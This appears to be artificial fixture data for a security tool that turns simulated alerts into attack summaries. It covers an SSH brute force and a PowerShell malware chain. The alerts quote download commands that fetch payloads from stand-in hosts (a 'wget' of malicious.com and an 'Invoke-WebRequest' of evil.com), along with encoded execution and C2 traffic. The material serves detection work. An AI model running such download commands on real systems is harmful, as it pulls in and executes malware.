Alert from 192.168.1.100: Successful SSH login for user 'admin' after 15 failed attempts
Alert from 192.168.1.100: Suspicious command 'wget http://malicious.com/payload.sh' executed via SSH session

attackDiscoveries.title: SSH Brute Force Attack
attackDiscoveries.summaryMarkdown: Coordinated SSH brute force attack from 192.168.1.100 targeting admin account
attackDiscoveries.detailsMarkdown: Attacker performed 15+ failed SSH login attempts followed by successful authentication and execution of a download cradle to fetch malicious payload

anonymizedAlerts.pageContent: Alert from host DESKTOP-01: PowerShell download cradle detected (Invoke-WebRequest http://evil.com/malware.exe)
Alert from host DESKTOP-01: Encoded PowerShell command executed (base64 obfuscation detected)
Alert from host DESKTOP-01: Suspicious child process 'rundll32.exe' spawned from PowerShell
Alert from host DESKTOP-01: Outbound connection to known C2 server 203.0.113.50:443

attackDiscoveries.title: PowerShell-Based Malware Execution Chain
attackDiscoveries.summaryMarkdown: Multi-stage PowerShell attack campaign on DESKTOP-01
attackDiscoveries.detailsMarkdown: Attacker used PowerShell download cradle with base64 encoding, injected into rundll32.exe, and established C2 communication with 203.0.113.50
